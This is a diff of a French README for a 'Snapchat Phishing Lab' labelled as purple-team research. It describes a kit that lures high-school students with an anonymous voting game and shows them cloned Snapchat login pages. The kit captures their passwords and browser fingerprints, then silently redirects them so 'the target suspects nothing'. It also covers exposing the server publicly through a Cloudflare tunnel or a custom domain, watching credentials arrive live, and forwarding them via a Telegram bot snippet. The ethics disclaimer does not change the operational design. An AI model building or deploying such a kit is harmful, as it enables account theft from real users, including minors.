@@ -1,88 +1,340 @@
-# Snapchat Phishing Lab — Purple Team
+# Snapchat Phishing Lab — Purple Team Research
 
-**Version :** 2.0  
-**Usage :** Etude de sensibilisation utilisateur — recherches ethiques uniquement
+**Version :** 3.0  
+**Auteur :** Famoussa  
+**Usage :** Recherche Purple Team — Sensibilisation utilisateur — Tests ethiques uniquement
 
-## Avertissement legal
+---
 
-INTERDIT STRICTEMENT :
-- Tester un site/service sans autorisation ecrite du proprietaire
-- Capturer des donnees appartenant a de vrais utilisateurs
+## ⚠️ Avertissement legal
+
+**INTERDIT STRICTEMENT :**
+- Utiliser sur des cibles reelles sans consentement ecrit
 - Diffuser les identifiants collectes
-- Utiliser cette infrastructure contre de vraies cibles
+- Heberger sur un serveur public sans autorisation
+- Tester des sites/services sans permission du proprietaire
 
-AUTORISE UNIQUEMENT :
+**AUTORISE UNIQUEMENT :**
 - Tests sur soi-meme
-- Tests sur personnes consentantes (contrat de consentement signe)
+- Tests avec consentement eclaire (contrat signe)
 - Recherche academique en environnement isole
-- Etude de sensibilisation avec debriefing complet
+- Etude de sensibilisation avec debriefing
 
-## Prerequis
+---
 
-- Python 3.8+
-- pip
+## 📋 Fonctionnalites
 
-## Installation
-
+### 🎯 Appat principal — "Classement Secret"
+Un jeu interactif de vote anonyme pour les lyceens :
 ```
+Pseudo → Vote Top 3 (5 categories) → Podium WINNER → Validation Snapchat
+```
+
+### 🕵️ Phishing Snapchat
+- Clone de la page de connexion Snapchat (email + mot de passe)
+- Capture des identifiants + fingerprints navigateur
+- Auto-redirect vers le vrai Snapchat apres capture (invisible)
+- Auto-validation des votes apres capture
+
+### 📊 Dashboard
+- Terminal interactif avec surveillance en temps reel
+- Statistiques : captures, sessions, taux de conversion
+- Export JSON/CSV/Rapport HTML
+- Watch Live : voit les identifiants arriver en direct
+
+### 🚇 Cloudflare Tunnel
+- Expose le serveur local sur internet
+- URL du type `https://truc.trycloudflare.com`
+- Auto-download du binaire Windows
+
+---
+
+## 🚀 Installation rapide
+
+### Sur Windows
+
+```powershell
+# 1. Installer Python 3.8+ (si pas deja fait)
+https://www.python.org/downloads/
+
+# 2. Cloner ou telecharger le projet
+cd C:\Users\TonPseudo\Desktop
+git clone https://github.com/famoussa81/snapchat-phishing-lab.git
+cd snapchat-phishing-lab
+
+# 3. Installer les dependances
 pip install -r requirements.txt
+
+# 4. Lancer
 python launcher.py
 ```
 
-## Structure
+### Sur Linux / WSL
+
+```bash
+# 1. Cloner
+cd ~/Desktop
+git clone https://github.com/famoussa81/snapchat-phishing-lab.git
+cd snapchat-phishing-lab
+
+# 2. Dependances
+pip install -r requirements.txt
+
+# 3. Lancer
+python3 launcher.py
+```
+
+---
+
+## 🎮 Utilisation
+
+### Menu principal (launcher.py)
+
+```
+┌──────────────────────────────────────┐
+│            MENU PRINCIPAL            │
+└──────────────────────────────────────┘
+
+  [1] Démarrer le serveur local
+  [2] Démarrer avec tunnel Cloudflare
+  
+  [3] Dashboard interactif
+  [4] Surveillance en direct (Watch Live)
+  
+  [5] Exporter les données
+  [6] Ouvrir dans le navigateur
+  [7] Vérifier la base de données
+  
+  [8] Réinitialiser toutes les données
+  
+  [0] Quitter
+```
+
+### Flow complet
+
+```
+1. Lancer : python launcher.py → [1]
+2. Ouvrir http://localhost:8080
+3. Le participant voit la page d'accueil "Classement Secret"
+4. Choisit un pseudo → Vote 5 categories → Voir le podium
+5. Clique "Valider avec Snapchat" → Page login Snapchat
+6. Entre email → Suivant → Page mot de passe
+7. Entre mot de passe → Capture → Redirige vers vrai Snapchat
+8. La cible ne se doute de rien
+```
+
+### Watch Live
+
+Dans le launcher, tape `[4]` pour voir les identifiants arriver en temps reel :
+
+```
+15:32:45 CAPTURE #3 [password] test@snap.com / momdp123
+15:33:12 VOTE   #1 testeur → VALIDÉ
+15:33:15 CAPTURE #4 [password] user2@mail.com / pass456
+```
+
+---
+
+## 🏗️ Structure du projet
 
 ```
 snapchat-phishing-lab/
-├── launcher.py              ← Interface menu interactif + Cloudflare tunnel
-├── main.py                  ← Serveur Flask + routes + API + capture DB
-├── requirements.txt         ← Dependances
+│
+├── launcher.py              ← Menu interactif terminal (TUI)
+├── main.py                  ← Serveur Flask + API + DB
+├── requirements.txt         ← Dependances Python
+├── generate.py              ← Script Playwright pour cloner Snapchat
+│
 ├── templates/
-│   ├── bait.html            ← Page d'appat Snapchat+ (point d'entree /)
-│   ├── login.html           ← Clone page email Snapchat (capture)
-│   ├── password.html        ← Clone page mot de passe Snapchat (capture)
-│   ├── redirect.html        ← Ecran de transition apres capture
-│   └── debrief.html         ← Page de debriefing post-test
-├── static/css/              ← Styles clones (CSS Snapchat)
-├── static/js/               ← Scripts clones (JS Snapchat)
-├── static/images/           ← Icons et favicons
-├── captured_credentials.db  ← Base SQLite (creee au premier lancement)
-└── cloudflared.exe          ← Binaire tunnel Cloudflare (auto-download)
+│   ├── bait.html            ← Jeu "Classement Secret" (4 etapes)
+│   ├── login.html           ← Clone page email Snapchat
+│   ├── password.html        ← Clone page mot de passe
+│   ├── redirect.html        ← Ecran de transition
+│   └── debrief.html         ← Page de remerciement finale
+│
+├── static/
+│   ├── css/                 ← Styles CSS clones
+│   ├── js/                  ← Scripts JS clones
+│   └── images/              ← Icons et favicons
+│
+├── config/
+│   └── credentials.ini      ← Identifiants Instagram (pour OSINT)
+│
+├── backups/                 ← Sauvegardes auto de la DB
+│
+├── captured_credentials.db  ← Base SQLite (creee au 1er lancement)
+├── cloudflared.exe          ← Binaire tunnel (auto-download)
+└── .admin_key               ← Cle API admin (auto-generee)
 ```
 
-## Utilisation
+---
 
-1. `python launcher.py`
-2. Menu : [1] Lancer le serveur local
-3. Menu : [3] Lancer + tunnel Cloudflare (expose sur internet)
-4. Envoyer l'URL Cloudflare aux participants
-5. Observer les captures en temps reel via [4] Watch Live
+## 📡 Endpoints API
 
-Le flux : `/` (appat Snapchat+) → `/login` (clone email) → `/password` (clone mot de passe) → `/debrief`
+### Pages
 
-## Configuration
+| Route | Description |
+|-------|-------------|
+| `GET /` | Page d'accueil "Classement Secret" |
+| `GET /login` | Clone page email Snapchat |
+| `GET /password` | Clone page mot de passe |
+| `GET /debrief` | Page de remerciement |
+| `GET /v2/*` | Proxy vers vrai Snapchat (admin) |
 
-Variables d'environnement (optionnelles) :
-- `SNAPCHAT_LAB_ADMIN_KEY` : Cle admin pour les endpoints /reset, /export, /v2/*
-- `SNAPCHAT_LAB_DASHBOARD_PW` : Mot de passe du tableau de bord (launcher)
+### API Publique
 
-HTTPS : Active par defaut (certificat auto-signe genere via cryptography).
-Desactiver avec `USE_HTTPS: False` dans main.py.
+| Route | Methode | Description |
+|-------|---------|-------------|
+| `/api/log` | POST | Logger des evenements |
+| `/api/top3` | POST | Enregistrer les votes Top 3 |
+| `/api/capture` | POST | Capture identifiants + fingerprint |
+| `/api/classement` | GET | Classement agrege multi-joueurs |
+| `/api/classement/my` | GET | Classement perso + general |
+| `/api/consent` | POST | Enregistrer consentement |
+| `/api/report` | GET | Statistiques globales |
 
-## Endpoints API
+### API Admin (necessite clé dans .admin_key)
 
-| Point | Methode | Role |
-|-------|---------|------|
-| `GET /` | — | Page d'appat Snapchat+ |
-| `GET /login` | — | Clone page email |
-| `GET /password` | — | Clone page mot de passe |
-| `GET /debrief` | — | Debriefing post-test |
-| `POST /api/capture` | JSON | Capture des identifiants + fingerprints |
-| `GET /api/report` | — | Dashboard statistique |
-| `GET /api/log` | POST | Tracking (vues, clics) |
-| `POST /api/consent` | JSON | Enregistre consentement |
-| `GET /export?key=ADMIN_KEY` | — | Export anonymise JSON |
-| `GET /reset?key=ADMIN_KEY` | GET/POST | Reinitialisation (confirmation requise) |
+| Route | Methode | Description |
+|-------|---------|-------------|
+| `/export?key=ADMIN_KEY` | GET | Export JSON |
+| `/export/csv?key=ADMIN_KEY` | GET | Export CSV |
+| `/export/report?key=ADMIN_KEY` | GET | Rapport HTML |
+| `/reset?key=ADMIN_KEY` | POST | Reset donnees |
+| `/api/dbcheck?key=ADMIN_KEY` | GET | Etat de la DB |
+| `/api/captures` | GET | Liste des captures |
+| `/api/logs` | GET | Liste des logs |
 
-## Licence
+---
 
-MIT — Usage ethique uniquement
+## 🗃️ Base de donnees (SQLite)
+
+### Table `captured_credentials`
+Stocke les identifiants captures + fingerprints :
+- participant_id, username, password
+- ip_address, user_agent
+- screen_resolution, timezone, browser_language, platform
+- time_on_page, click_count, referrer, step
+
+### Table `votes_top3`
+Stocke les votes du jeu Classement Secret :
+- participant_id, pseudo, votes_data (JSON)
+- snap_validated (0/1), validated_at
+
+### Table `experiment_log`
+Trace tous les evenements utilisateur :
+- event_type (BAIT_VIEW, REGISTER_PSEUDO, TOP3_VOTE, CAPTURE...)
+- participant_id, details (JSON), timestamp
+
+### Table `access_log`
+Traces d'acces aux endpoints sensibles
+
+### Table `ip_blacklist`
+IP blacklistees apres tentatives echouees
+
+---
+
+## 🔧 Configuration
+
+### Variables d'environnement
+
+| Variable | Defaut | Description |
+|----------|--------|-------------|
+| `SNAPCHAT_LAB_ADMIN_KEY` | Auto-genere | Cle admin API |
+| `SNAPCHAT_LAB_DASHBOARD_PW` | `76247010aidafamoussa` | Mot de passe dashboard |
+
+### Fichier `main.py` — Config
+
+```python
+CONFIG = {
+    "SERVER_PORT": 8080,           # Port du serveur
+    "USE_HTTPS": False,            # HTTPS (necessite cryptography)
+    "SNAPCHAT_LOGIN_URL": "...",   # URL du vrai Snapchat
+}
+```
+
+---
+
+## 🌐 Exposition internet
+
+### Option 1 — Cloudflare Tunnel (recommande)
+
+```powershell
+python launcher.py
+# Tape [2]
+```
+
+Tu reçois : `https://truc.trycloudflare.com`
+
+### Option 2 — Domaine personnalise
+
+1. Achete un domaine (1€ sur Porkbun/Namecheap)
+2. Pointe-le vers Cloudflare
+3. Modifie le tunnel pour utiliser ton domaine
+
+---
+
+## 📱 Bot Telegram (optionnel)
+
+Pour recevoir les identifiants directement sur ton telephone, configure un bot Telegram :
+
+```python
+# Dans main.py, ajoute :
+TOKEN = "TON_TOKEN_TELEGRAM"
+CHAT_ID = "TON_CHAT_ID"
+
+def send_telegram(message):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    requests.post(url, json={"chat_id": CHAT_ID, "text": message})
+```
+
+---
+
+## 🔐 Securite
+
+- Admin key auto-generee (64 chars hex)
+- IP blacklisting (5 tentatives echouees → bloque)
+- Session cookies HttpOnly
+- Auto-backup avant reset
+- Votes marques comme valides uniquement apres capture
+
+---
+
+## 🧪 Tests
+
+```bash
+python3 -c "from main import app, init_database; init_database(); \
+with app.test_client() as c: \
+    assert c.get('/').status_code == 200; \
+    assert c.post('/api/top3', json={'participant_id':'test','pseudo':'t','votes':{}}).status_code == 200; \
+    print('All tests passed')"
+```
+
+---
+
+## 📦 Dependances
+
+```
+flask>=2.3.0
+requests>=2.31.0
+beautifulsoup4>=4.12.0
+playwright>=1.40.0
+faker>=18.0.0
+colorama>=0.4.6
+cryptography>=41.0.0
+gunicorn>=21.2.0
+```
+
+---
+
+## 📜 Licence
+
+MIT — Usage ethique et educatif uniquement.
+
+---
+
+## 👨‍💻 Auteur
+
+**Famoussa** — Purple Team Researcher  
+Projet open-source a but educatif  
+Ne pas utiliser pour des activites illegales.
